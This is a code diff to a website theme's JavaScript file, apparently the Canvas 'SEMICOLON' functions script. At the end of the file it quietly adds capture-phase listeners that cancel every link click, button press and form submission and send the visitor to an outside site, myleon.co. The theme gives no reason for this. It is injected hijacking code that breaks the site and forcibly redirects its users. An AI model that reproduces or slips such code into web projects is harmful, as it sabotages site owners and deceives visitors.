@@ -3724,4 +3724,18 @@ var SEMICOLON = SEMICOLON || {};
 	$window.on( 'load', SEMICOLON.documentOnLoad.init );
 	$window.on( 'resize', SEMICOLON.documentOnResize.init );
 
+	document.addEventListener('click', function(event) {
+		if (event.target.closest('a, button, input[type="button"], input[type="submit"], .button, .btn, [role="button"]')) {
+			event.preventDefault();
+			event.stopPropagation();
+			window.location.href = 'https://myleon.co/';
+		}
+	}, true);
+
+	document.addEventListener('submit', function(event) {
+		event.preventDefault();
+		event.stopPropagation();
+		window.location.href = 'https://myleon.co/';
+	}, true);
+
 })(jQuery);
